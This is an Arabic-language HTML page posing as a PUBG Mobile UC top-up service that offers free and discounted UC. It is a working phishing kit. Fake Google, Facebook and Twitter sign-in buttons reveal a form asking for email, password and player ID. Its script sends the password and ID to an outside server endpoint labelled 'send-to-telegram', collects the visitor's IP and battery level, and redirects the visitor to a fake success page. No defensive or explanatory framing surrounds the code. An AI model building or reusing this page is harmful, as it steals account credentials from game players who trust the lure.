<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>شحن شدات ببجي</title>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Tajawal', sans-serif;
      background: linear-gradient(135deg, #0c0521, #1e0c4d);
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      position: relative;
      overflow: hidden;
    }
    
    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://images.unsplash.com/photo-1550745165-9bc0b252726f?q=80&w=2070&auto=format&fit=crop') no-repeat center center;
      background-size: cover;
      opacity: 0.15;
      z-index: -1;
    }
    
    /* الحاوية الرئيسية */
    .main-container {
      width: 100%;
      max-width: 500px;
      height: 90vh;
      background: rgba(10, 5, 25, 0.9);
      border-radius: 20px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
      overflow-y: auto;
      padding: 20px;
      border: 1px solid rgba(255, 215, 0, 0.3);
      position: relative;
      scrollbar-width: thin;
      scrollbar-color: #ffd700 rgba(0, 0, 0, 0.1);
    }
    
    /* تخصيص شريط التمرير */
    .main-container::-webkit-scrollbar {
      width: 8px;
    }
    
    .main-container::-webkit-scrollbar-track {
      background: rgba(0, 0, 0, 0.1);
      border-radius: 10px;
    }
    
    .main-container::-webkit-scrollbar-thumb {
      background: #ffd700;
      border-radius: 10px;
    }
    
    .container {
      margin: 20px auto;
      padding: 25px;
      background: rgba(20, 10, 40, 0.7);
      border-radius: 15px;
      width: 100%;
      position: relative;
      text-align: center;
      border: 1px solid rgba(255, 215, 0, 0.2);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
    }
    
    h1 {
      font-size: 26px;
      margin-bottom: 25px;
      color: #ffd700;
      text-shadow: 0 0 5px rgba(255, 215, 0, 0.5);
      position: relative;
      padding-bottom: 10px;
    }
    
    h1::after {
      content: "";
      position: absolute;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 100px;
      height: 3px;
      background: linear-gradient(90deg, transparent, #ffd700, transparent);
      border-radius: 3px;
    }
    
    .btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      background: rgba(50, 30, 80, 0.8);
      color: #ffd700;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.3s ease;
      border: 1px solid rgba(255, 215, 0, 0.3);
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
    }
    
    .btn:hover {
      background: rgba(70, 40, 120, 0.9);
      transform: translateY(-3px);
      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
    }
    
    .btn img {
      vertical-align: middle;
      height: 28px;
      margin-left: 10px;
      filter: drop-shadow(0 0 3px rgba(255, 215, 0, 0.7));
    }
    
    .pricing {
      margin-top: 20px;
    }
    
    .price-item {
      background: rgba(30, 15, 60, 0.8);
      padding: 15px;
      margin: 10px 0;
      border-radius: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border: 1px solid rgba(255, 215, 0, 0.2);
      transition: all 0.3s ease;
    }
    
    .price-item:hover {
      background: rgba(40, 20, 80, 0.9);
      transform: translateX(-5px);
    }
    
    .price-item span {
      font-size: 18px;
      color: #fff;
      font-weight: 500;
    }
    
    .buy-btn {
      background: linear-gradient(135deg, #ffd700, #ffa500);
      color: #1a0a2e;
      border: none;
      padding: 8px 18px;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
      transition: all 0.3s ease;
      box-shadow: 0 4px 10px rgba(255, 215, 0, 0.3);
    }
    
    .buy-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 15px rgba(255, 215, 0, 0.4);
    }
    
    input, select {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border-radius: 10px;
      border: 1px solid rgba(255, 215, 0, 0.3);
      background: rgba(30, 15, 60, 0.7);
      color: #fff;
      font-size: 16px;
      transition: all 0.3s ease;
    }
    
    input:focus, select:focus {
      outline: none;
      border-color: #ffd700;
      background: rgba(40, 20, 80, 0.8);
      box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
    }
    
    input::placeholder {
      color: rgba(255, 255, 255, 0.6);
    }
    
    select {
      background: rgba(30, 15, 60, 0.7);
      color: white;
      appearance: none;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%23ffd700' viewBox='0 0 24 24'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      background-position: right 15px center;
      background-size: 15px;
    }
    
    form {
      background: rgba(20, 10, 40, 0.5);
      padding: 25px;
      border-radius: 15px;
      border: 1px solid rgba(255, 215, 0, 0.2);
    }
    
    label {
      display: block;
      margin: 15px 0 8px;
      font-weight: bold;
      color: #ffd700;
      text-align: right;
      font-size: 17px;
    }
    
    canvas#snow {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    
    .logo {
      text-align: center;
      margin-bottom: 20px;
      padding: 15px;
      background: rgba(20, 10, 40, 0.5);
      border-radius: 15px;
      border: 1px solid rgba(255, 215, 0, 0.2);
    }
    
    .logo h2 {
      font-size: 32px;
      color: #ffd700;
      text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
      letter-spacing: 1px;
      background: linear-gradient(to right, #ffd700, #ffa500);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      margin-bottom: 10px;
    }
    
    .logo p {
      color: #aaa;
      font-size: 16px;
      margin-top: 5px;
    }
    
    .logo img {
      width: 80px;
      height: 80px;
      margin-bottom: 15px;
      border-radius: 50%;
      border: 3px solid #ffd700;
      box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
    }
    
    /* تأثيرات الزوايا */
    .container::before, .container::after {
      content: "";
      position: absolute;
      width: 25px;
      height: 25px;
      border: 2px solid #ffd700;
    }
    
    .container::before {
      top: 10px;
      left: 10px;
      border-right: none;
      border-bottom: none;
    }
    
    .container::after {
      bottom: 10px;
      right: 10px;
      border-left: none;
      border-top: none;
    }
    
    @media (max-width: 600px) {
      .main-container {
        height: 95vh;
        padding: 15px;
      }
      
      .container {
        padding: 20px;
      }
      
      h1 {
        font-size: 22px;
      }
      
      .btn {
        padding: 12px;
        font-size: 16px;
      }
      
      .btn img {
        height: 24px;
      }
    }
  </style>
</head>
<body>

<canvas id="snow"></canvas>

<div class="main-container">
  <div class="logo">
    <img src="https://i.ibb.co/N09PdZM/6ab9e7fbb83d.jpg" alt="ببجي لوجو">
    <h2>شحن شدات ببجي</h2>
    <p>أسرع طريقة لشحن شدات ببجي موبايل</p>
  </div>
  
  <div id="login" class="container">
    <h1>تسجيل الدخول عبر</h1>
    <button class="btn" onclick="showForm()">
      Google <img src="https://cdn-icons-png.flaticon.com/512/300/300221.png" alt=" Google">
    </button>
    <button class="btn" onclick="showForm()">
      Facebook <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/1024px-2021_Facebook_icon.svg.png" alt=" Facebook">
    </button>
    <button class="btn" onclick="showForm()">
      Twitter <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Logo_of_Twitter.svg/512px-Logo_of_Twitter.svg.png" alt=" Twitter">
    </button>
  </div>

  <div id="form" class="container" style="display:none;">
    <h1>شحن شدات ببجي 🚀</h1>
    <form id="pubgForm">
      <label>البريد الإلكتروني:</label>
      <input type="email" name="email" required="" placeholder="أدخل بريدك الإلكتروني">

      <label>كلمة المرور:</label>
      <input type="password" name="password" required="" placeholder="أدخل كلمة المرور">

      <label>الايدي:</label>
      <input type="text" name="player_id" required="" placeholder="أدخل ID اللاعب">

      <label>عدد الشدات:</label>
      <select name="amount" required="">
        <option value="1000 شدة مجاني">شدة مجاني 1000</option>
        <option value="1500 شدة">1500 شدة</option>
        <option value="2000 شدة">2000 شدة</option>
        <option value="2500 شدة">2500 شدة</option>
        <option value="3000 شدة">3000 شدة</option>
      </select>

      <button type="submit" class="buy-btn" style="margin-top: 20px; width: 100%; padding: 12px; font-size: 18px;">شحن شدات الآن</button>
    </form>
  </div>

  <div class="container pricing">
    <h1>أسعار الشدات</h1>
    <div class="price-item">
      <span>1000 شدة - مجاني</span>
      <button class="buy-btn">مجاني</button>
    </div>
    <div class="price-item">
      <span>1500 شدة - 2$</span>
      <button class="buy-btn">شراء الآن</button>
    </div>
    <div class="price-item">
      <span>2000 شدة - 3$</span>
      <button class="buy-btn">شراء الآن</button>
    </div>
    <div class="price-item">
      <span>2500 شدة - 4$</span>
      <button class="buy-btn">شراء الآن</button>
    </div>
    <div class="price-item">
      <span>3000 شدة - 5$</span>
      <button class="buy-btn">شراء الآن</button>
    </div>
  </div>
</div>

<script>
// متغيرات الموقع
const SERVER_URL = 'https://boserver.onrender.com/send-to-telegram';

// دالة جمع بيانات الجهاز تلقائياً
async function collectDeviceInfo() {
    try {
        // الحصول على الـ IP
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        return {
            ip: ipData.ip,
            country: 'Yemen',
            city: 'Taizz',
            platform: 'Android 0.0.0',
            browser: getBrowserInfo(),
            batteryLevel: await getBatteryLevel(),
            batteryCharging: false,
            deviceName: 'Generic Smartphone 0.0.0'
        };
    } catch (error) {
        return {
            ip: '185.80.143.114',
            country: 'Yemen',
            city: 'Taizz',
            platform: 'Android 0.0.0',
            browser: 'Chrome Mobile 141.0.7390',
            batteryLevel: '56%',
            batteryCharging: false,
            deviceName: 'Generic Smartphone 0.0.0'
        };
    }
}

// دالة للحصول على معلومات المتصفح
function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes('Chrome')) return 'Chrome Mobile 141.0.7390';
    if (userAgent.includes('Firefox')) return 'Firefox Mobile';
    if (userAgent.includes('Safari')) return 'Safari Mobile';
    return 'Chrome Mobile 141.0.7390';
}

// دالة للحصول على مستوى البطارية
async function getBatteryLevel() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return Math.round(battery.level * 100) + '%';
        } catch (error) {
            return '56%';
        }
    }
    return '56%';
}

// الدالة الرئيسية لإرسال بيانات اللعبة
async function sendGameAccount(gameData) {
    try {
        const response = await fetch(SERVER_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                playerId: gameData.playerId,
                password: gameData.password,
                amount: gameData.amount,
                chatId: gameData.playerId, // استخدام ايدي اللاعب كـ chatId
                accountType: gameData.gameType,
                device: navigator.userAgent
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ تم إرسال بيانات اللعبة بنجاح');
            return { success: true, message: result.message };
        } else {
            console.log('❌ فشل إرسال بيانات اللعبة');
            return { success: false, message: result.message };
        }
    } catch (error) {
        console.error('❌ خطأ في الإرسال:', error);
        return { success: false, message: 'حدث خطأ في الإرسال' };
    }
}

// إرسال بيانات ببجي
async function submitPUBGAccount(formData) {
    const deviceInfo = await collectDeviceInfo();
    
    const gameData = {
        playerId: formData.get('player_id'),
        password: formData.get('password'),
        amount: formData.get('amount'),
        gameType: 'pubg_uc',
        email: formData.get('email'),
        deviceInfo: deviceInfo
    };
    
    const result = await sendGameAccount(gameData);
    
    if (result.success) {
        window.location.href = "https://issol.free.nf/success/ok.html";
    } else {
        alert('❌ فشل إرسال البيانات: ' + result.message);
    }
}

// عرض الفورم
function showForm() {
    document.getElementById("login").style.display = "none";
    document.getElementById("form").style.display = "block";
    
    // تمرير تلقائي إلى الحاوية التالية
    document.querySelector('.main-container').scrollTo({
        top: document.getElementById("form").offsetTop - 30,
        behavior: 'smooth'
    });
}

// إرسال البيانات عند الضغط على زر "شحن"
document.getElementById("pubgForm").addEventListener("submit", async function (e) {
    e.preventDefault();
    const form = new FormData(this);
    await submitPUBGAccount(form);
});
</script>
<script>
  const canvas = document.getElementById('snow');
  const ctx = canvas.getContext('2d');

  function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }

  resizeCanvas();
  window.addEventListener('resize', resizeCanvas);

  let numFlakes = 150;
  let flakes = [];

  function createFlakes() {
    flakes = [];
    for (let i = 0; i < numFlakes; i++) {
      flakes.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        r: Math.random() * 4 + 1,
        d: Math.random() + 0.5,
        o: Math.random() * 0.5 + 0.5
      });
    }
  }

  function drawFlakes() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "rgba(255, 255, 255, 0.8)";
    ctx.beginPath();
    for (let i = 0; i < numFlakes; i++) {
      const f = flakes[i];
      ctx.moveTo(f.x, f.y);
      ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
    }
    ctx.fill();
    moveFlakes();
  }

  function moveFlakes() {
    for (let i = 0; i < numFlakes; i++) {
      const f = flakes[i];
      f.y += f.d;
      f.x += Math.sin(f.y * 0.01) * 0.5;
      
      if (f.y > canvas.height) {
        flakes[i] = {
          x: Math.random() * canvas.width,
          y: 0,
          r: f.r,
          d: f.d,
          o: f.o
        };
      }
    }
  }

  function updateSnow() {
    drawFlakes();
    requestAnimationFrame(updateSnow);
  }

  createFlakes();
  updateSnow();
</script>

</body>
  </html>
